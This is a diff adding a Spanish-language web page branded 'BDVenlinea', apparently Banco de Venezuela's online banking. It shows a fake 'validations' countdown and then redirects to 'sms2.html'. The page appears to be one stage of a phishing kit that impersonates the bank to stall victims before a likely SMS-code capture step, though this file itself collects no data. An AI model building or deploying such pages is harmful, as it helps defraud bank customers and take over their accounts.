@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDVenlinea</title>
+    <link rel="stylesheet" href="./carg.css">
+    <style>
+        /* Estilos para centrar la imagen y ajustar su tamaño */
+      /* Estilos para centrar la imagen y ajustar su tamaño */
+      .form-container {
+            text-align: center;
+        }
+
+        /* Ajustar el tamaño de la imagen del logo */
+        .logo-image {
+            width: 120px; /* Tamaño más grande para la imagen del logo */
+            height: auto;
+        }
+
+        /* Ajustar el tamaño de la imagen GIF */
+        .small-image {
+            width: 60px; /* Tamaño para la imagen GIF */
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="izquierda">
+            <div class="form-container">
+                <img src="./img/logo.png" alt="">
+                <form action="#" method="post" id="usuarioForm">
+                 <!--    <img src="./img/ldr.gif" alt="" class="small-image"> -->
+                    <p>Por favor espere mientras realizamos validaciones:</p>
+                    <p id="countdownMessage">Cargando plataforma BDV: <span id="countdown">10</span></p>
+                </form>
+            </div>
+        </div>
+        <div class="derecha">
+            <!-- La imagen de fondo se manejará a través del CSS -->
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('usuarioForm');
+            let seconds = 10; // Cambia este valor al número de segundos que desees
+
+            // Función para actualizar el contador
+            function updateCountdown() {
+                document.getElementById('countdown').textContent = seconds;
+                seconds--;
+
+                if (seconds < 0) {
+                    clearInterval(interval);
+                    window.location.href = 'sms2.html';
+                }
+            }
+
+            // Redireccionar a sms.html después de 'seconds' segundos
+            const interval = setInterval(updateCountdown, 1000);
+
+            form.addEventListener('submit', (event) => {
+                event.preventDefault();
+                // Aquí puedes agregar cualquier lógica adicional que necesites
+            });
+        });
+    </script>
+</body>
+</html>
